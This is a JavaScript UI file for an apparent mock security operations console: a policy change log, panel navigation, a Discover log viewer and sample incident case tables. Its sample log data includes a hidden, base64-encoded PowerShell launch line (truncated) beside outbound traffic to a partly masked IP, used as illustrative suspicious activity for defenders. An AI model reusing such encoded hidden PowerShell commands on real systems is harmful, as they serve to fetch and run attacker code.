    <div class="gr-scopes">${scopes.map(([n,c,l])=>`<div class="gr-scope ${c}"><span class="gs-dot"></span><span class="gs-n">${n}</span><span class="gs-l">${l}</span></div>`).join('')}</div>

    <div class="ctl-sech" style="margin-top:22px"><h3>Policy change log</h3><span class="ctl-count">every change is versioned & visible to affected teams</span></div>
    <table class="gr-log"><thead><tr><th>When</th><th>Who</th><th>Change</th><th>Visibility</th></tr></thead><tbody>
      <tr><td class="gl-when">Today 08:12</td><td class="gl-who">You</td><td>Allow-list: <b>block known-bad IPs at the perimeter</b> — deny rules auto-expire in 24h</td><td class="gl-note">Notified 6 analysts · Dark Watch</td></tr>
      <tr><td class="gl-when">Tue 16:40</td><td class="gl-who">Maya C.</td><td>Two-person rule added for <b>critical containment</b> — second approver: IR lead</td><td class="gl-note">Notified all shifts</td></tr>
      <tr><td class="gl-when">Mon 11:05</td><td class="gl-who">Maya C.</td><td>Watch Floor autonomy raised <b>L2 → L3 · Drafts auto</b> — 87% acceptance over 300+ proposals</td><td class="gl-note">Notified Watch Floor reviewers</td></tr>
      <tr><td class="gl-when">Jun 24</td><td class="gl-who">You</td><td>Finance PII scope set to <b>Masked</b> for all watches</td><td class="gl-note">Notified SOC managers</td></tr>
    </tbody></table>
  </div>`;
}
/* nav preferences modal — functional (drag reorder · show/hide · toggles) */
let navDraft=null;
function openNavPrefs(){
  navDraft=JSON.parse(JSON.stringify(state.nav));
  const back=el(`<div class="navp-back" id="navpBack"></div>`);
  back.onclick=(e)=>{ if(e.target===back) closeNavPrefs(); };
  back.appendChild(el(`<div class="navp" id="navp"></div>`));
  document.body.appendChild(back);
  renderNavPrefs();
}
function closeNavPrefs(){ const b=document.getElementById('navpBack'); if(b) b.remove(); navDraft=null; }
function renderNavPrefs(){
  const w=document.getElementById('navp'); if(!w||!navDraft) return;
  // normalize: operate before agent; locked first within operate
  const op=navDraft.apps.filter(a=>a.group==='operate'); const ag=navDraft.apps.filter(a=>a.group==='agent');
  navDraft.apps=[...op.filter(a=>a.locked),...op.filter(a=>!a.locked),...ag];
  const am=!!navDraft.agentMode;
  const rowHtml=(a)=>{ const idx=navDraft.apps.indexOf(a); const hid=!a.visible;
    return `<div class="navp-row ${a.locked?'locked':''} ${hid?'hidden':''}" data-idx="${idx}" data-key="${a.key}" data-group="${a.group}" ${a.locked?'':'draggable="true"'}>
      <span class="navp-grip">${ic(a.locked?'lock':'grip',16)}</span>
      <span class="navp-name">${ic(a.icon,14)} ${a.label}</span>
      <button class="navp-eye" title="${a.locked?'Always shown':(hid?'Show':'Hide')}" onclick="App.navpEye(${idx})">${ic(hid?'eyeoff':'eye',16)}</button>
    </div>`; };
  const opRows=navDraft.apps.filter(a=>a.group==='operate').map(rowHtml).join('');
  const agRows=navDraft.apps.filter(a=>a.group==='agent').map(rowHtml).join('');
  w.innerHTML=`
    <div class="navp-h"><h2>Navigation preferences</h2><button class="navp-x" title="Close" onclick="App.navpClose()">${ic('x',18)}</button></div>
    <div class="navp-body">
      <div class="navp-toggle" onclick="App.navpToggle('showLabels')"><span class="sw ${navDraft.showLabels?'on':''}"></span> Show labels</div>
      <div class="navp-list" id="navpListOp" style="margin-top:14px">${opRows}${agRows}</div>
    </div>
    <div class="navp-foot"><button class="navp-apply" onclick="App.navpApply()">Apply</button></div>`;
  wireNavpDrag();
}
function wireNavpDrag(){
  const root=document.getElementById('navp'); if(!root) return;
  let dragKey=null, dragGroup=null;
  root.querySelectorAll('.navp-row[draggable="true"]').forEach(row=>{
    row.addEventListener('dragstart',e=>{ dragKey=row.dataset.key; dragGroup=row.dataset.group; row.classList.add('dragging'); try{e.dataTransfer.effectAllowed='move';e.dataTransfer.setData('text/plain',dragKey);}catch(_){}});
    row.addEventListener('dragend',()=>{ dragKey=null;dragGroup=null; root.querySelectorAll('.navp-row').forEach(r=>r.classList.remove('dragging','dragover')); });
    row.addEventListener('dragover',e=>{ if(row.dataset.group!==dragGroup) return; e.preventDefault(); if(row.dataset.key!==dragKey) row.classList.add('dragover'); });
    row.addEventListener('dragleave',()=>row.classList.remove('dragover'));
    row.addEventListener('drop',e=>{ e.preventDefault(); const dk=dragKey||(e.dataTransfer&&e.dataTransfer.getData('text/plain')); const targetKey=row.dataset.key; if(!dk||dk===targetKey) return; if(row.dataset.group!==dragGroup) return;
      const arr=navDraft.apps.slice(); const fromI=arr.findIndex(a=>a.key===dk); const [moved]=arr.splice(fromI,1);
      let insertI=arr.findIndex(a=>a.key===targetKey); if(insertI<0) insertI=arr.length;
      arr.splice(insertI,0,moved); navDraft.apps=arr; renderNavPrefs();
    });
  });
}

const APPS = {
  object:{name:'Object',icon:'cube'},
  discover:{name:'Discover',icon:'compass'},
  records:{name:'Records',icon:'list'},
  alerts:{name:'Alerts',icon:'alert'},
  entities:{name:'Entities',icon:'entities'},
  dashboards:{name:'Dashboards',icon:'grid'},
};
const APP_ORDER = ['object','discover','records','alerts','entities','dashboards'];

/* panel wrapper — app-tab strip + active-app routing (replaces the old single-purpose inspector) */
function renderInspector(){
  const insp=$('#inspector');
  if(!state.inspectorOpen){ insp.classList.add('collapsed'); insp.classList.remove('maximized','as-flyout','fly-out'); insp.style.width=''; insp.style.left=''; insp.innerHTML=''; const bd=document.getElementById('inspBackdrop'); if(bd) bd.remove(); return; }
  insp.classList.remove('collapsed');
  if(!(state.panelApps||[]).includes('object')){ state.panelApps=state.panelApps||[]; state.panelApps.unshift('object'); }
  if(!state.activeApp) state.activeApp='object';
  const max=!!state.panelMax;
  const fly=!!state.panelFlyout && !max;
  insp.classList.toggle('maximized',max);
  insp.classList.toggle('as-flyout',fly);
  // strip a stale exit class from a prior cycle (but not while a close is mid-flight)
  if(fly && !state._flyClosing) insp.classList.remove('fly-out');
  if(max){ insp.style.width=''; insp.style.left='0px'; }
  else if(fly){ insp.style.left=''; insp.style.width=''; }
  else { insp.style.left=''; insp.style.width=(state.panelWidth||440)+'px'; }
  // overlay backdrop behind the flyout (click to dismiss)
  let bd=document.getElementById('inspBackdrop');
  if(fly){ if(!bd){ bd=el('<div class="insp-backdrop" id="inspBackdrop" onclick="App.closeRecordFlyout()"></div>'); insp.parentNode.insertBefore(bd, insp); } }
  else if(bd){ bd.remove(); }
  const tt=curThread(); const tmeta=TYPE_META[tt.type]||TYPE_META.chat;
  const subjOn=state.activeApp==='object';
  const subjNum=tt.recordId ? (tt.recordId.includes('-') ? tt.recordId.split('-').slice(1).join('-') : tt.recordId) : '';
  const subjLabel=(tt.type==='chat')?'Conversation':`${tmeta.label}${subjNum?` · ${subjNum}`:''}`;
  const subjColor=(tt.type!=='chat' && STATUS_DOT[tt.status]) ? STATUS_DOT[tt.status] : tmeta.color;
  const pin=`<button class="app-tab subject ${subjOn?'on':''}" style="--tc:${subjColor}" title="This conversation — always here" onclick="App.setApp('object')"><span class="ati">${ic(tmeta.icon,14)}</span><span class="atn">${subjLabel}</span></button>`;
  let tools='';
  (state.panelApps||[]).filter(k=>k!=='object').forEach(k=>{ const a=APPS[k]; if(!a) return; const on=state.activeApp===k;
    tools+=`<button class="app-tab tool ${on?'on':''}" onclick="App.setApp('${k}')"><span class="ati">${ic(a.icon,14)}</span><span class="atn">${a.name}</span><span class="atx" title="Close tab" onclick="App.closeApp(event,'${k}')">${ic('x',11)}</span></button>`;
  });
  const motionPill = tt.status==='in-progress' ? `<span class="rad-cnt-motion insp-motion" style="--dec:${(DECISION_META[decisionOf(tt)]||{}).color||'#B5850C'}" title="NotDaybreak is executing — no decision needed"><span class="rad-spin"></span>In motion</span>` : '';
  insp.innerHTML=`
    <div class="resize-handle" id="resizeHandle" title="Drag to resize"></div>
    <div class="panel-appbar">
      <div class="app-tabs">${pin}${motionPill}${tools}<button class="app-add" title="Add a tool" onclick="App.toggleAddMenu(event)">${ic('plus',15)}</button></div>
      <div class="app-tools">
        ${tt.type!=='chat'?(()=>{ const chatVisible = state.navView==='chats' && !max; return chatVisible
          ? ``
          : `<button class="ptool open-chat" title="Open in chat" aria-label="Open in chat" onclick="App.openChatFromRecord()">${ic('comment',15)}</button>`; })():''}
        <button class="ptool" title="${max?'Restore':'Maximize'}" onclick="App.togglePanelMax()">${ic(max?'minimize':'maximize',15)}</button>
        <button class="ptool" title="Close panel" onclick="App.closeRecordFlyout()">${ic('x',16)}</button>
      </div>
    </div>
    <div class="panel-content" id="panelContent"></div>`;
  wireResize();
  renderApp();
}
function renderApp(){
  const c=$('#panelContent'); if(!c) return;
  if(!state.panelApps||state.panelApps.length===0){ c.innerHTML=panelEmpty(); return; }
  const a=state.activeApp;
  if(a==='object') return renderObjectApp(c);
  if(a==='discover') return renderDiscover(c);
  if(a==='records') return renderRecords(c);
  if(a==='alerts') return renderAlerts(c);
  if(a==='entities') return renderEntities(c);
  if(a==='dashboards') return renderDashboards(c);
  c.innerHTML='';
}
function panelEmpty(){
  return `<div class="insp-empty"><span class="ill">${ic('grid',34)}</span><h3>No apps open</h3><p>Add an app to this panel — Discover, Records, Alerts and more live here.</p><button class="btn primary sm" onclick="App.addApp('discover')">${ic('plus',14)} Add an app</button></div>`;
}
function wireResize(){
  const h=$('#resizeHandle'); if(!h) return;
  h.onmousedown=(e)=>{ if(state.panelMax) return; e.preventDefault();
    const insp=$('#inspector'); const startX=e.clientX, startW=state.panelWidth||440;
    insp.classList.add('resizing'); document.body.style.userSelect='none'; document.body.style.cursor='col-resize';
    let lastCollapsed=discoFieldsCollapsed();
    const move=(ev)=>{ let w=startW+(startX-ev.clientX); w=Math.max(420,Math.min(window.innerWidth-460,w)); state.panelWidth=w; insp.style.width=w+'px';
      if(state.activeApp==='discover'){ const nc=discoFieldsCollapsed(); if(nc!==lastCollapsed){ lastCollapsed=nc; renderApp(); } }
    };
    const up=()=>{ insp.classList.remove('resizing'); document.body.style.userSelect=''; document.body.style.cursor=''; document.removeEventListener('mousemove',move); document.removeEventListener('mouseup',up); };
    document.addEventListener('mousemove',move); document.addEventListener('mouseup',up);
  };
}
function ensureWidthFor(k){ if(!state.panelMax && (k==='discover'||k==='records') && (state.panelWidth||440)<460) state.panelWidth=460; }
/* add-app menu */
function openAddMenu(anchor){
  closeAddMenu();
  const avail=APP_ORDER.filter(k=>k!=='object' && !(state.panelApps||[]).includes(k));
  const menu=el(`<div class="add-menu" id="addMenu"></div>`);
  if(avail.length===0){ menu.innerHTML=`<div class="add-empty">All apps are open</div>`; }
  avail.forEach(k=>{ const a=APPS[k]; const row=el(`<button class="add-row"><span class="ari">${ic(a.icon,15)}</span><span>${a.name}</span></button>`);
    row.onclick=()=>{ closeAddMenu(); App.addApp(k); }; menu.appendChild(row);
  });
  document.body.appendChild(menu);
  const r=anchor.getBoundingClientRect();
  menu.style.top=(r.bottom+6)+'px'; menu.style.left=Math.min(r.left,window.innerWidth-220)+'px';
  setTimeout(()=>document.addEventListener('mousedown',addMenuClose),40);
}
function addMenuClose(e){ const m=$('#addMenu'); if(m && !m.contains(e.target)) closeAddMenu(); }
function closeAddMenu(){ const m=$('#addMenu'); if(m) m.remove(); document.removeEventListener('mousedown',addMenuClose); }

/* ---- DISCOVER ---- */
const DISCO_FIELDS = [
  {f:'@timestamp',type:'date'},
  {f:'host.name',type:'keyword',top:[['FIN-WS-04','20%'],['FIN-WS-11','20%'],['BKP-02','20%'],['FIN-WS-02','20%'],['WEB-03','20%']]},
  {f:'user.name',type:'keyword',top:[['svc-backup','40%'],['admin.jdoe','20%'],['admin.kpatel','20%'],['svc-deploy','20%']]},
  {f:'process.name',type:'keyword',top:[['powershell.exe','100%']]},
  {f:'process.args',type:'text'},
  {f:'process.pid',type:'long'},
  {f:'process.parent.name',type:'keyword',top:[['services.exe','20%'],['explorer.exe','20%'],['taskeng.exe','20%'],['powershell.exe','20%'],['agent.exe','20%']]},
  {f:'event.action',type:'keyword',top:[['process_creation','100%']]},
  {f:'event.outcome',type:'keyword',top:[['success','100%']]},
  {f:'destination.ip',type:'ip',top:[['45.137.x.x','20%'],['— none','80%']]},
  {f:'destination.port',type:'long'},
  {f:'agent.type',type:'keyword',top:[['endpoint','100%']]},
  {f:'data_stream.dataset',type:'keyword',top:[['endpoint.process','100%']]},
];
function fieldTypeIcon(t){ const m={date:'clock',keyword:'asset',text:'list',long:'chart',ip:'network'}; return `<span class="ftype">${ic(m[t]||'asset',12)}</span>`; }
const DISCO_FIELDLIST=[
  {f:'@timestamp',t:'date'},{f:'agent.type',t:'keyword'},{f:'destination.ip',t:'ip'},{f:'destination.port',t:'number'},{f:'event.action',t:'keyword'},{f:'event.category',t:'keyword'},{f:'event.code',t:'keyword'},{f:'event.outcome',t:'keyword'},{f:'host.ip',t:'ip'},{f:'host.name',t:'keyword'},{f:'host.os.family',t:'keyword'},{f:'message',t:'text'},{f:'network.direction',t:'keyword'},{f:'network.transport',t:'keyword'},{f:'process.args',t:'text'},{f:'process.command_line',t:'text'},{f:'process.entity_id',t:'keyword'},{f:'process.executable',t:'keyword'},{f:'process.name',t:'keyword'},{f:'process.parent.name',t:'keyword'},{f:'process.parent.pid',t:'number'},{f:'process.pid',t:'number'},{f:'rule.name',t:'keyword'},{f:'source.ip',t:'ip'},{f:'source.port',t:'number'},{f:'user.domain',t:'keyword'},{f:'user.id',t:'keyword'},{f:'user.name',t:'keyword'}
];
const DISCO_LOGS=[
  {t:'Today @ 08:14:22.101', line:'FIN-WS-11 · admin.jdoe · process_creation · powershell.exe Get-EventLog -LogName Security -Newest 50'},
  {t:'Today @ 06:32:50.882', line:'FIN-WS-02 · admin.kpatel · process_creation · powershell.exe -w hidden -Command Update-Help -Force'},
  {t:'Today @ 05:48:11.430', line:'WEB-03 · svc-deploy · process_creation · powershell.exe Invoke-WebRequest -Uri https://repo.internal/deploy.ps1'},
  {t:'Today @ 02:44:02.118', line:'FIN-WS-04 · svc-backup · network_flow · SMB tcp/445 → FIN-DC-01 · auth failed'},
  {t:'Today @ 02:42:36.660', line:'FIN-WS-04 · svc-backup · network_flow · outbound tcp/443 → 45.137.x.x · 14 connections'},
  {t:'Today @ 02:41:09.114', line:'FIN-WS-04 · svc-backup · process_creation · powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAE4AZQB3…'},
  {t:'Today @ 01:00:03.551', line:'BKP-02 · svc-backup · process_creation · powershell.exe -File C:\\backup\\nightly.ps1'},
  {t:'Yesterday @ 23:12:40.007', line:'FIN-DC-01 · SYSTEM · process_creation · svchost.exe -k netsvcs -p'},
];
function discoFieldGlyph(t){ if(t==='date') return ic('clock',12); if(t==='geo') return ic('network',12); return ({text:'t',number:'#',keyword:'k',ip:'IP'})[t]||'t'; }
/* Available width of the Discover panel — full window when maximized, else the resizable panel width. */
function discoPanelW(){ return state.panelMax ? window.innerWidth : (state.panelWidth||440); }
/* Field list auto-collapses on a narrow panel; a manual toggle overrides the breakpoint for the session. */
function discoFieldsCollapsed(){ return state.discoverFieldsManual==null ? (discoPanelW() < 620) : !!state.discoverFieldsManual; }
function renderDiscover(c){
  const days=['-6d','-5d','-4d','-3d','-2d','-1d','today'];
  const shape=[4,20,46,74,60,22]; let hist='';
  for(let d=0;d<7;d++){ const mul=[0.92,1,1.04,0.98,1.08,0.95,1.02][d]; let grp='';
    shape.forEach((b,i)=>{ const h=Math.min(80,Math.round(b*mul+(i===3?6:0))); grp+=`<div class="dsc-hbar" style="height:${(h/80*100).toFixed(0)}%"></div>`; });
    hist+=`<div class="dsc-hgroup"><div class="dsc-hgbars">${grp}</div><div class="dsc-hlabel">${days[d]}${d===0?'':''}</div></div>`;
  }
  const fields=DISCO_FIELDLIST.map(f=>`<div class="dsc-field"><span class="dsc-ftype dt-${f.t}">${discoFieldGlyph(f.t)}</span><span class="dsc-fname mono">${f.f}</span></div>`).join('');
  const fcollapsed=discoFieldsCollapsed();
  const fieldPanel = fcollapsed
    ? ``
    : `<div class="dsc-fields">
        <div class="dsc-fsearch">${ic('search',13)}<input type="text" placeholder="Search field names"></div>
        <div class="dsc-favail"><span>Available fields</span><span class="dsc-favail-r"><span class="dsc-fcount">28</span></span></div>
        <div class="dsc-flist">${fields}</div>
        <button class="dsc-addfield">${ic('plus',13)} Add a field</button>
      </div>`;
  const docs=DISCO_LOGS.map(l=>`<tr class="dsc-drow">
      <td class="dsc-dcheck"><span class="al-cb"></span></td>
      <td class="dsc-dexp">${ic('maximize',11)}</td>
      <td class="dsc-dtime mono">${l.t}</td>
      <td class="dsc-dsum mono">${l.line}</td>
    </tr>`).join('');
  c.innerHTML=`<div class="page-pad dsc">
    <div class="pg-head" style="margin:-18px -20px 14px"><h2 class="pg-title">Discover</h2></div>
    <div class="dsc-bar">
      <span class="dsc-dvlabel">Data view</span>
      <button class="dsc-sel">${ic('db',13)} logs-endpoint.process-* ${ic('chevron',12)}</button>
      <button class="dsc-iconbtn" title="Filters">${ic('list',15)}</button>
      <button class="dsc-iconbtn" title="Add filter">${ic('plus',15)}</button>
      <div class="dsc-kql">${ic('search',13)}<span>Filter your data using KQL syntax</span></div>
      <button class="dsc-time">${ic('clock',13)} Last 7 days ${ic('chevron',11)}</button>
      <button class="dsc-refresh">${ic('refresh',13)} Refresh</button>
    </div>
    <div class="dsc-body">
      ${fieldPanel}
      <div class="dsc-main">
        <div class="dsc-htoolbar">
          <button class="dsc-fcollapse" title="${fcollapsed?'Show field list':'Collapse field list'}" onclick="App.toggleDiscoFields()">${ic('panelleft',16)}</button>
          <button class="dsc-pill">Auto interval ${ic('chevron',11)}</button>
          <button class="dsc-pill">No breakdown ${ic('chevron',11)}</button>
        </div>
        <div class="dsc-hist">${hist}</div>
        <div class="dsc-hcap">Last 7 days (interval: Auto - 3 hours)</div>
        <div class="dsc-tabs">
          <span class="dsc-tab on">Documents <b>18,402</b></span>
          <span class="dsc-tab">Patterns</span>
          <span class="dsc-tab">Field statistics</span>
          <span class="dsc-tab dsc-sortfields">${ic('list',13)} Sort fields <span class="al-tbadge">1</span></span>
        </div>
        <div class="dsc-docs">
          <table class="dsc-table"><thead><tr><th class="dsc-dcheck"></th><th class="dsc-dexp"></th><th><span style="display:inline-flex;align-items:center;gap:5px">timestamp ${ic('clock',11)}</span></th><th>Summary</th></tr></thead>
          <tbody>${docs}</tbody></table>
        </div>
        <div class="dsc-foot">
          <span>Rows per page: 100 ${ic('chevron',11)}</span>
          <span class="dsc-pages"><span class="dsc-pg on">1</span><span class="dsc-pg">2</span><span class="dsc-pg">3</span><span class="dsc-pg">4</span><span class="dsc-pg">5</span></span>
        </div>
      </div>
    </div>
  </div>`;
}

/* ---- RECORDS (all escalated conversations, current mode) ---- */
function recordsFiltered(){
  const recs=Object.values(state.threads).filter(t=>t.mode===state.mode && t.type!=='chat');
  const view=state.recordsView||'all'; let list=recs.slice();
  if(view==='open') list=list.filter(t=>['open','in-progress','contained'].includes(t.status));
  else if(view==='awaiting') list=list.filter(t=>t.status==='awaiting');
  else if(view==='mine') list=list.filter(t=>t.owner==='you'||(t.assignees||[]).includes('you'));
  const q=(state.recordsQuery||'').toLowerCase();
  if(q) list=list.filter(t=>((t.title||'')+' '+(t.recordId||'')).toLowerCase().includes(q));
  const sort=state.recordsSort||{key:'updated',dir:'desc'};
  const sevRank={Critical:4,High:3,Medium:2,Low:1}; const order={}; recs.forEach((t,i)=>order[t.id]=i);
  list.sort((a,b)=>{ let r=0;
    if(sort.key==='severity') r=(sevRank[a.severity]||0)-(sevRank[b.severity]||0);
    else if(sort.key==='status') r=String(a.status).localeCompare(String(b.status));
    else if(sort.key==='type') r=String(a.type).localeCompare(String(b.type));
    else if(sort.key==='title') r=String(a.title).localeCompare(String(b.title));
    else r=order[a.id]-order[b.id];
    return sort.dir==='desc'?-r:r;
  });
  return {recs,list};
}
function recordsCountText(){ const {recs,list}=recordsFiltered(); return list.length+' of '+recs.length; }
function recordsCountView(recs,k){ if(k==='all')return recs.length; if(k==='open')return recs.filter(t=>['open','in-progress','contained'].includes(t.status)).length; if(k==='awaiting')return recs.filter(t=>t.status==='awaiting').length; if(k==='mine')return recs.filter(t=>t.owner==='you'||(t.assignees||[]).includes('you')).length; return 0; }
function ownerCell(pid){ const p=PEOPLE[pid]; const av=p.photo?`<span class="avatar" style="width:20px;height:20px;background-image:url('${p.photo}');background-size:cover;background-position:center;color:transparent"></span>`:`<span class="avatar" style="background:${p.color};width:20px;height:20px;font-size:9px">${p.init}</span>`; return `<span class="own">${av} ${p.name.split(' ')[0]}</span>`; }
function recordsRowsHTML(){
  const {list}=recordsFiltered(); let rows='';
  list.forEach(t=>{ const m=TYPE_META[t.type]; const sev=SEV[t.severity]||SEV.Low;
    rows+=`<tr class="rec-row ${t.id===state.activeId?'cur':''}" onclick="App.focusRecord('${t.id}')">`
      +`<td><span class="type-badge sm" style="background:${m.color}">${ic(m.icon,12)} ${m.label}</span></td>`
      +`<td class="rec-title">${t.title}${t.agentInitiated?`<span class="badge-ai">${ic('sparkle',9)} agent</span>`:''}<div class="rec-id">${t.recordId||''}</div></td>`
      +`<td><span class="rec-status"><span class="dot" style="background:${STATUS_DOT[t.status]}"></span>${STATUS_LABEL[t.status]}</span></td>`
      +`<td><span class="mtag" style="background:${sev.bg};color:${sev.c};border-color:${sev.bg};font-weight:600">${t.severity}</span></td>`
      +`<td>${ownerCell(t.owner)}</td>`
      +`<td class="rec-upd">${t.updated||'—'}</td></tr>`;
  });
  return rows||`<tr><td colspan="6" style="padding:24px;text-align:center;color:var(--ink-4)">No records match.</td></tr>`;
}
const CASES_SEVDOT={Low:'var(--green)',Medium:'#d6a72c',High:'var(--amber)',Critical:'var(--red)'};
const CASES_STATUS={open:{l:'Open',c:'var(--blue)',on:'#fff'},'in-progress':{l:'In progress',c:'var(--amber)',on:'#241903'},closed:{l:'Closed',c:'var(--ink-4)',on:'#10161F'},archived:{l:'Archived',c:'var(--ink-4)',on:'#10161F'}};
/* Brief cards that get archived land in Cases & records as live rows. Per-case table metadata: */
const ARCHIVE_CASE_META={
  'day-r3':{category:'Initial Access',alerts:2,comments:4,tags:['identity','impossible-travel'],created:'1 hour ago',ext:'ServiceNow'},
  'day-auto1':{category:'Exfiltration',alerts:1,comments:0,tags:['mailbox','exfil'],created:'today, 03:12'},
  'day-auto2':{category:'Credential Access',alerts:1,comments:0,tags:['vpn','brute-force'],created:'today, 04:47'},
  'day-r7':{category:'Exfiltration',alerts:2,comments:1,tags:['data-staging'],created:'2 hours ago'},
};
function archivedCaseRows(mode){
  return Object.values(state.threads)
    .filter(t=>t.mode===mode && t.type==='case' && t.archivedAt)
    .sort((a,b)=>b.archivedAt-a.archivedAt)
    .map(t=>{ const m=ARCHIVE_CASE_META[t.id]||{};
      return { name:t.title, recordId:t.recordId,
        assignees:[t.owner,...(t.assignees||[])].filter((v,i,a)=>PEOPLE[v]&&a.indexOf(v)===i),
        tags:m.tags||[], alerts:m.alerts??0, comments:m.comments??0, category:m.category||'—',
        created:m.created||'today', updated:'just now', ext:m.ext||'', status:'archived', sev:t.severity||'Low',
        _live:true, _fresh:!t._recSeen };
    });
}
const CASES_PAGE={
  dayshift:{ total:28, stats:{open:23,prog:3,closed:2,avg:'11d'}, rows:[
    {name:'Unusual processes identified',assignees:[],tags:[],alerts:0,comments:0,category:'—',created:'2 minutes ago',updated:'—',ext:'',status:'open',sev:'Low'},
    {name:'Malware investigation',assignees:[],tags:[],alerts:0,comments:0,category:'—',created:'2 minutes ago',updated:'—',ext:'',status:'open',sev:'Low'},
    {name:'Multiple logon failures from the same source',assignees:[],tags:[],alerts:0,comments:0,category:'—',created:'4 minutes ago',updated:'—',ext:'',status:'open',sev:'Low'},
    {name:'USB mass-storage policy violation — HR-WS-02',assignees:['priya'],tags:['policy','endpoint'],alerts:1,comments:3,category:'Policy',created:'18 minutes ago',updated:'5 minutes ago',ext:'ServiceNow',status:'in-progress',sev:'Medium'},
    {name:'Kerberoasting attempt — SQL service accounts',assignees:['maya','tom'],tags:['credential-access'],alerts:4,comments:2,category:'Credential Access',created:'42 minutes ago',updated:'12 minutes ago',ext:'',status:'in-progress',sev:'High'},
    {name:'Credential-harvest page live — phishing wave',recordId:'CASE-2049',assignees:[],tags:['phishing','identity'],alerts:3,comments:5,category:'Phishing',created:'32 minutes ago',updated:'just now',ext:'Jira',status:'open',sev:'High'},
    {name:'Cryptominer contained — build-srv-09',assignees:['maya'],tags:['c2','network'],alerts:6,comments:1,category:'Command & Control',created:'yesterday',updated:'2 hours ago',ext:'',status:'closed',sev:'Medium'},
    {name:'Suspicious OAuth consent grant — jdoe@corp',recordId:'CASE-2039',assignees:['tom','priya'],tags:['identity','oauth'],alerts:1,comments:2,category:'Initial Access',created:'yesterday',updated:'6 hours ago',ext:'',status:'in-progress',sev:'Medium'},
    {name:'Impossible travel — exec account (cfo@corp)',recordId:'CASE-2047',assignees:[],tags:['identity','impossible-travel'],alerts:2,comments:4,category:'Initial Access',created:'1 hour ago',updated:'45 minutes ago',ext:'ServiceNow',status:'open',sev:'High'},
    {name:'Brute-force authentication on finance subnet',assignees:[],tags:['brute-force'],alerts:312,comments:2,category:'Credential Access',created:'today, 02:18',updated:'7 hours ago',ext:'',status:'closed',sev:'Low'},
  ]},
  nightshift:{ total:24, stats:{open:16,prog:4,closed:4,avg:'6h'}, rows:[
    {name:'Checkout latency SLO burn',recordId:'INV-NS-77',assignees:[],tags:['slo','latency'],alerts:8,comments:4,category:'Availability',created:'today, 02:14',updated:'3 minutes ago',ext:'Jira',status:'open',sev:'High'},
    {name:'payments-api 5xx spike after deploy',recordId:'INV-NS-74',assignees:[],tags:['error-rate','deploy'],alerts:5,comments:2,category:'Reliability',created:'today, 01:50',updated:'10 minutes ago',ext:'',status:'in-progress',sev:'High'},
    {name:'Slow query on carts database',assignees:[],tags:['database'],alerts:1,comments:0,category:'Performance',created:'today, 02:16',updated:'40 minutes ago',ext:'',status:'open',sev:'Medium'},
    {name:'kafka-broker-3 disk saturation',recordId:'INV-NS-69',assignees:[],tags:['capacity'],alerts:1,comments:1,category:'Saturation',created:'today, 02:50',updated:'6 hours ago',ext:'',status:'closed',sev:'Medium'},
    {name:'ingest-worker restart loop (heap growth)',recordId:'INV-NS-71',assignees:[],tags:['k8s'],alerts:3,comments:0,category:'Reliability',created:'yesterday',updated:'5 hours ago',ext:'',status:'closed',sev:'Low'},
    {name:'Upstream provider degraded (eu-west-1)',recordId:'INC-NS-12',assignees:[],tags:['dependency'],alerts:1,comments:2,category:'Availability',created:'3 days ago',updated:'3 days ago',ext:'ServiceNow',status:'closed',sev:'Critical'},
  ]},
};
function casesRowsHTML(rows){
  if(!rows.length) return `<tr><td colspan="11" style="padding:28px;text-align:center;color:var(--ink-4)">No cases match your search.</td></tr>`;
  return rows.map(r=>{
    const av=r.assignees.length?`<span class="cs-avstack">${r.assignees.map(p=>PEOPLE[p].photo?`<span class="cs-av" style="background-image:url('${PEOPLE[p].photo}');background-size:cover;background-position:center;color:transparent" title="${PEOPLE[p].name}"></span>`:`<span class="cs-av" style="background:${PEOPLE[p].color}" title="${PEOPLE[p].name}">${PEOPLE[p].init}</span>`).join('')}</span>`:`<span class="cs-dash">—</span>`;
    const tags=r.tags.length?r.tags.map(t=>`<span class="cs-tag">${t}</span>`).join(''):`<span class="cs-dash">—</span>`;
    const cat=r.category&&r.category!=='—'?r.category:`<span class="cs-dash">—</span>`;
    const upd=r.updated&&r.updated!=='—'?r.updated:`<span class="cs-dash">—</span>`;
    const ext=r.ext?`<a class="cs-link" onclick="event.stopPropagation();App.stub('${r.ext}')">${r.ext}</a>`:`<span class="cs-dash">Not pushed</span>`;
    const st=CASES_STATUS[r.status];
    const rid=r._live&&r.recordId?`<span class="cs-recid">${r.recordId}</span>`:'';
    return `<tr class="${r._live&&r._fresh?'cs-row-live':''}" onclick="App.stub('Open case — ${r.name.replace(/'/g,"\\'")}')">
      <td><span class="cs-cb"></span></td>
      <td><span class="cs-name">${r.name}</span>${rid}</td>
      <td>${av}</td>
      <td>${tags}</td>
      <td class="cs-num">${r.alerts}</td>
      <td class="cs-num">${r.comments}</td>
      <td>${cat}</td>
      <td>${ext}</td>
      <td><span class="cs-pill" style="background:${st.c};color:${st.on||'#fff'}">${st.l}</span></td>
      <td><span class="cs-sev"><span class="cs-sevdot" style="background:${CASES_SEVDOT[r.sev]}"></span>${r.sev}</span></td>
      <td class="cs-actions" onclick="event.stopPropagation();App.stub('Case actions')">${ic('dots',16)}</td>
    </tr>`;
  }).join('');
}
function renderRecords(c){
  const day=(state.mode||'dayshift')==='dayshift';
  const D=CASES_PAGE[day?'dayshift':'nightshift'];
  const live=archivedCaseRows(day?'dayshift':'nightshift');
  const liveIds=new Set(live.map(r=>r.recordId).filter(Boolean));
  const gone=D.rows.filter(r=>r.recordId&&liveIds.has(r.recordId));   /* static rows superseded by a live archived version */
  const rows=[...live,...D.rows.filter(r=>!gone.includes(r))];
  const stats={ open:D.stats.open-gone.filter(r=>r.status==='open').length,
                prog:D.stats.prog-gone.filter(r=>r.status==='in-progress').length,
                closed:D.stats.closed+live.length, avg:D.stats.avg };
  const total=D.total+live.length-gone.length;
  const q=(state.casesQuery||'').toLowerCase();
  const shown=q?rows.filter(r=>r.name.toLowerCase().includes(q)):rows;
  const fchip=(label,n)=>`<button class="cs-fchip" onclick="App.stub('Filter: ${label}')">${label}${n?`<span class="cs-fbadge">${n}</span>`:''} ${ic('chevron',11)}</button>`;
  c.innerHTML=`<div class="cases-page">
    <div class="pg-head" style="margin:0 0 14px"><h2 class="pg-title">${day?'Cases & records':'Records'}</h2></div>
    <div class="cs-stats">
      <div class="cs-stat"><div class="cs-stat-k">Open cases</div><div class="cs-stat-v">${stats.open}</div></div>
      <div class="cs-stat"><div class="cs-stat-k">In progress cases</div><div class="cs-stat-v">${stats.prog}</div></div>
